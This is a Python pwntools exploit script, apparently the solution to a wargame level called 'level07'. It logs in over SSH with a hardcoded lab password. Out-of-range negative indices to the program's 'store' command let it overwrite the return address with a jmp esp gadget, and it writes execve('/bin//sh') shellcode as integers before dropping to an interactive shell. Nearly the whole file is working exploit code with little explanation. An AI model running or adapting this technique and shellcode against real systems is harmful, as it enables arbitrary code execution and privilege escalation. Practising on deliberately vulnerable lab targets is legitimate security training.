from pwn import *

### INFORMATIONS ###

# >> Overwriting return address
# Index to overwrite return address :   -2147483534
# jmp esp gadget @ 0xf7e67610
# Number to redirect to jmp esp gadget : 4158843477

a = 0x6850c031
b = 0x68732f2f
c = 0x69622f68
d = 0x89e3896e
e = 0xb0c289c1
f = 0x3180cd0b
g = 0x80cd40c0


s = ssh(host="192.168.1.3", port=4242, user="level07", password="GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8")
p = s.process("/home/users/level07/./level07")

p.sendline(b'store')
p.sendline(str(4158843477).encode())
p.sendline(str(-2147483534).encode())

p.sendline(b'store')
p.sendline(str(a).encode())
p.sendline(str(115).encode())

p.sendline(b'store')
p.sendline(str(b).encode())
p.sendline(str(116).encode())

p.sendline(b'store')
p.sendline(str(c).encode())
p.sendline(str(-2147483531).encode())

p.sendline(b'store')
p.sendline(str(d).encode())
p.sendline(str(118).encode())

p.sendline(b'store')
p.sendline(str(e).encode())
p.sendline(str(119).encode())

p.sendline(b'store')
p.sendline(str(f).encode())
p.sendline(str(-2147483528).encode())

p.sendline(b'store')
p.sendline(str(g).encode())
p.sendline(str(121).encode())

p.sendline(b'quit')

p.interactive()



### MANUAL EXPLOITATION

#print("Number : " + str(4158843477) + " | Index : " + str(-2147483534))
#print("Number : " + str(a) + " | Index : " + str(115))
#print("Number : " + str(b) + " | Index : " + str(116))
#print("Number : " + str(c) + " | Index : " + str(-2147483531))
#print("Number : " + str(d) + " | Index : " + str(118))
#print("Number : " + str(e) + " | Index : " + str(119))
#print("Number : " + str(f) + " | Index : " + str(-2147483528))
#print("Number : " + str(g) + " | Index : " + str(121))






